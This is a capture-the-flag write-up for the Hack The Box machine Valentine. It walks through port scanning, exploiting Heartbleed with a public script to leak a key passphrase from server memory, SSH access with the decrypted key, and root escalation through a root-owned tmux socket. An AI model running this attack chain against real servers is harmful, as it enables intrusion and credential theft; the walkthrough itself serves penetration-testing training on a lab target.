# Valentine - Linux, easy (10.10.10.79)

### Enumeration
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2022-08-21T21:13:35+00:00; 0s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
gobuster dir -u http://valentine.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
/index                (Status: 200) [Size: 38]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/]
/decode               (Status: 200) [Size: 552]                              
/encode               (Status: 200) [Size: 554]                              
/omg                  (Status: 200) [Size: 153356]
```

In `https://valentine.htb/dev/` we can find two files, **hype_key** and **notes.txt**.
File hype_key is a bunch of hexadecimal bytes, while notes.txt contains the following notes:
```
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

If we decode the bytes in hype_key we obtain an RSA certificate!
```
wget http://valentine.htb/dev/hype_key
cat hype_key | xxd -r -p > hype_key_enc
```
But if we try to decrypt it with `openssl` it will ask for a passphrase that we do not have:
```
root@kali:~/hackthebox/valentine-10.10.10.79# openssl rsa -in hype_key_enc -out hype_key_dec
Enter pass phrase for hype_key_encrypted:
```

### Heartbleed
As the image in the website and the machine name suggest, this challenge may be based on the heartbleed attack.
Searching for this attack with `searchsploit`, we can find the following script `multiple/remote/32745.py`.
Copy it and execute it.
After executing this script for some times, we should see some data:
```
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 53  mV0aGVoeXBlCg==S
```

If we save these bytes in a file and run `xxd -r saved_bytes` we should see:
```
ntent-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```

And then,
```
kali@kali:~/HackTheBox/retired/Linux/easy/Valentine$ echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d
heartbleedbelievethehype
```

This should can be a password!

### Clever method to get the password
Run the script for a while:
```
for i in $(seq 1 10000); do ./32745.py 10.10.10.79 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" > data_dump/dump$i; done
```

Then using `fdupes` remove the duplicate files:
```
fdupes -rf . | grep -v '^$' > files
xargs -a files rm -v
```
`fdupes -rf` finds recursively (-r) files in the current directory and omits the first file in each set of matches (-f).
With `grep -v '^$'` we ignore all the blank lines that are created between each set of files and the result is inserted in a file.
Then we remove all the files in the current directory that are in `files`.
In this way, for each set of files that are the same, in the directory we will keep only one copy of them.

Now simply open some of the files untils you see the string `decode` and the base64 string that represents the password.

### Obtain user Hype
Now that we have a password, we can try `openssl` to decrypt the key, execute `openssl rsa -in hype_key_enc -out hype_key_dec`.
Insert the passphrase previously obtained to get the private key!

Now simply `ssh -i hype_key_dec hype@10.10.10.79` to get a shell.

Note that if you receive the following error when running this command and then the password for user hype is requested:
```
sign_and_send_pubkey: no mutual signature supported
hype@10.10.10.79's password: 
```
Run the following command to connect `ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i hype_dec hype@10.10.10.79`.

### From Hype to Root
Running `ps aux` reveals a `tmux` session being run as the user root:
```
root       1028  0.0  0.1  26416  1668 ?        Ss   14:12   0:01 /usr/bin/tmux -S /.devs/dev_sess
```

By simply exeuting `/usr/bin/tmux -S /.dev/dev_sess` we will connect to the session with full root privileges!
